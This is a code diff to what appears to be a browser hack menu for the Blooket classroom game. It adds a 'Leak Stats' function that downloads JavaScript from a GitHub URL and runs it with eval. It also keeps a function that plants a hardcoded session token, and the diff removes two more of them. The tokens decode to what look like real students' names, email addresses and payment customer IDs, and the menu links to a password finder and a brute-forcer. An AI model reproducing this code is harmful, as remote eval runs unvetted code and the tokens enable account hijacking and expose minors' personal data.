@@ -102,15 +102,11 @@
         window.open("https://replit.com/@mikeylmao/Blooket-pass-finder", "", "width=1550,height=1000,left=0");
   }
   
+  function leakStats(){
+        fetch("https://raw.githubusercontent.com/seanv999/BlooketStatsLeaker/main/Bundle.js").then((res) => res.text().then((t) => eval(t)));
+  }
+  
   function blooketAccA(){
-        localStorage.token="JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9lbWFtYUVaWlpaIiwic3RyaXBlIjoiY3VzX0tNVGRaaXVXRGpoTExKIiwicGxhbiI6IlN0YXJ0ZXIiLCJnYW1lc1BsYXllZCI6MCwiZW1haWwiOiJ0YXNoYXVubWlsZXMyQGdtYWlsLmNvbSIsImRhdGVDcmVhdGVkIjoiMjAyMS0xMC0wN1QwMDo0MTo0MC45MjNaIiwicm9sZSI6IlN0dWRlbnQiLCJoYXNQYXNzd29yZCI6ZmFsc2UsImlhdCI6MTYzMzU2NzMwMywiZXhwIjoxNjM0MTcyMTAzfQ.5dcraRWYi1lbrcaeBCK0ziYxaovdxnXisMldUzpfO3Q"
-  }
-  
-  function blooketAccB(){
-        localStorage.token="JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiVGFzaGF1bk0iLCJzdHJpcGUiOiJjdXNfSzlENEl4QktmV0FKTHIiLCJwbGFuIjoiU3RhcnRlciIsImdhbWVzUGxheWVkIjozMiwiZW1haWwiOiJtaWxlc3Rhc2hhdW4zQGdtYWlsLmNvbSIsImRhdGVDcmVhdGVkIjoiMjAyMS0wOS0wMVQxNDo0MjoyMy4xOTJaIiwicm9sZSI6IlN0dWRlbnQiLCJoYXNQYXNzd29yZCI6dHJ1ZSwiaWF0IjoxNjMzNTY5NzA5LCJleHAiOjE2MzQxNzQ1MDl9.qig76dlNzV62RKtG9r34F7b6cIEzHwj9kcdgvoXD0U4"
-  }
-  
-  function blooketAccC(){
         localStorage.token="JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiVHJlbnQuSyIsInN0cmlwZSI6ImN1c19JbzB3V1hLMVVSNVVybSIsInBsYW4iOiJTdGFydGVyIiwiZ2FtZXNQbGF5ZWQiOjksImVtYWlsIjoia3VyZGVzdEBzdHVkZW50cy51cHNkLm9yZyIsImRhdGVDcmVhdGVkIjoiMjAyMS0wMS0yMlQxMjozOTowNC44MDRaIiwicm9sZSI6IlN0dWRlbnQiLCJoYXNQYXNzd29yZCI6ZmFsc2UsImV4cCI6MTYzNDE1MDI5NSwiaWF0IjoxNjMzNTM4NzEwfQ.x1QTFHor105d-yqIdQ8xpl8EDhwe8d7MbD6kSNxr-BE"
   }
   
@@ -162,11 +158,9 @@
         e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', whiteSpace: 'break-spaces'}}, ' | '),
         e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: blooketBruteForcer}, 'Blooket BruteForcer'),
         e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', whiteSpace: 'break-spaces'}}, ' | '),
-        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: blooketAccA}, 'Account 1'),
+        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: leakStats}, 'Leak Stats'),
         e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', whiteSpace: 'break-spaces'}}, ' | '),
-        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: blooketAccB}, 'Account 2'),
-        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', whiteSpace: 'break-spaces'}}, ' | '),
-        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: blooketAccC}, 'Account 3'),
+        e('p', {style: {display: 'inline-block', color: 'white', fontFamily: "'Roboto Mono', monospace", margin: '0', cursor: 'pointer'}, onClick: blooketAccA}, 'Blooket Account'),
         e(TreeContainer, {setObj: obj => this.setObj(obj), obj: JSON.parse(localStorage.getItem('prefs')), showing: false, name: 'Prefs', isRoot: true}),
         e(TreeContainer, {setObj: obj => this.piSetObj(obj), obj: JSON.parse(localStorage.getItem('injectables')), showing: false, name: 'Injectables', isInjectable: true, update: () => this.forceUpdate(), isRoot: true}),
         e('style', null, "@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap');")
